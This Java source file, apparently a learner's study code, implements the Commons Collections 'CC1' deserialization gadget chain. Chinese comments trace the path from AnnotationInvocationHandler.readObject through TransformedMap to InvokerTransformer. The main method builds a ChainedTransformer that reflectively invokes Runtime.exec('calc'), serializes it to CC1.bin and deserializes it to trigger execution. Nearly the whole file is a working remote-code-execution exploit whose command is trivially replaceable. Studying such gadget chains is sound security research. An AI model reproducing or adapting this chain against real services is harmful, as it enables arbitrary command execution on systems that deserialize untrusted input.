package org.example.CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.example.SerUtils;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/*
* AnnotationHandler.readObject()
* ->AbstractInputCheckedMapDecorator.MapEntry.setValue()
*  ->TransformedMap.checkSetValue()
*   ->ChainedTransformer.transform()
*    ->InvokerTransformer.transform()
* */
public class CC1 {
    public void testChain(String[] args) {
        // 初步实验
        new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"}).transform(Runtime.getRuntime());
        // 获取一个runtime实例
        Runtime shell = Runtime.getRuntime();
        // 第一层
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
        // 第二层
        Map<Object,Object> map=new HashMap<>();
        map.put("Hacking","3xsh0re");

        //TransformedMap.decorate方法调用TransformedMap的构造方法
        //构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。
        Map<Object,Object> transformedMap = TransformedMap.decorate(map, null, invokerTransformer);

        //AbstractInputCheckedMapDecorator类中的MapEntry类的setValue()方法（作用是遍历map）
        //调用了 TransformedMap类中的checkSetValue()方法
        for(Map.Entry entry:transformedMap.entrySet()){
            entry.setValue(shell);
        }
    }
    public static void debugChain(String[] args) throws Exception{
        // 获取一个runtime实例
        Runtime shell = Runtime.getRuntime();
        // 第一层
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"});
        // 第二层
        Map map=new HashMap();
        map.put("Hacking","3xsh0re");

        //TransformedMap.decorate方法调用TransformedMap的构造方法
        //构造方法把invoker实例赋值给TransformedMap.valueTransformer属性
        Map transformedMap = TransformedMap.decorate(map, null, invokerTransformer);

        // 通过反射获取AnnotationInvocationHandler的实例
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationConstructor.setAccessible(true);
        Object obj = annotationConstructor.newInstance(Override.class, transformedMap);
        SerUtils.serialize(obj,"CC1.bin");
        SerUtils.unserialize("CC1.bin");

    }
    public static void main(String[] args) throws Exception{
        // 第一层
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        // 第二层
        Map<Object, Object> map = new HashMap<>();
        map.put("value", "3xsh0re");

        //TransformedMap.decorate方法调用TransformedMap的构造方法
        //构造方法把invoker实例赋值给TransformedMap.valueTransformer属性。
        Map<Object, Object> transformedMap =
                TransformedMap.decorate(map, null, transformerChain);

        // 通过反射获取AnnotationInvocationHandler的实例
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationConstructor.setAccessible(true);
        Object obj = annotationConstructor.newInstance(Target.class, transformedMap);
        SerUtils.serialize(obj,"CC1.bin");
        SerUtils.unserialize("CC1.bin");
    }
}